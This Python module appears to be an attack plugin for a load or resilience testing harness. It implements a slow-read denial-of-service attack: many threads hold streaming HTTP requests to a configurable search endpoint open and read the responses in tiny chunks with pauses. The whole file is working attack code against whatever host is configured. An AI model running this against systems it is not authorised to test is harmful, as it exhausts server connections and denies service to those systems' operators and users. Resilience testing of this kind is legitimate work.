#!/usr/bin/env python3
import threading
import time
import logging
import requests


class Attack:
    def __init__(self, configuration, design_path, output_path, test_identifier):
        self.configuration = configuration
        self.output_path = output_path
        self.base_url = (configuration.get("locust_host_url") or "").rstrip("/")
        self.path = configuration.get("attack_slow_reader_path") or "/api/v1/search?pagesize=1000"
        self.concurrency = int(float(configuration.get("attack_concurrency", 20)))
        self.timeout = float(configuration.get("attack_request_timeout_seconds", 60))
        self.chunk_size = int(float(configuration.get("attack_slow_reader_chunk_size", 32)))
        self.pause = float(configuration.get("attack_slow_reader_pause_seconds", 0.1))

    def worker(self, end_ts, stop_event):
        url = f"{self.base_url}{self.path}"
        session = requests.Session()
        headers = {"Accept": "application/json"}
        while (time.time() < end_ts) and (not stop_event.is_set()):
            try:
                with session.get(url, headers=headers, stream=True, timeout=self.timeout) as r:
                    for _ in r.iter_content(chunk_size=self.chunk_size):
                        if (time.time() >= end_ts) or stop_event.is_set():
                            break
                        time.sleep(self.pause)
            except Exception:
                pass

    def run(self, duration_seconds, stop_event):
        logging.info("slow_reader: starting")
        end_ts = time.time() + duration_seconds
        threads = [threading.Thread(target=self.worker, args=(end_ts, stop_event), daemon=True) for _ in range(self.concurrency)]
        for t in threads:
            t.start()
        for t in threads:
            remaining = max(0.0, end_ts - time.time())
            t.join(timeout=remaining)
        logging.info("slow_reader: finished")

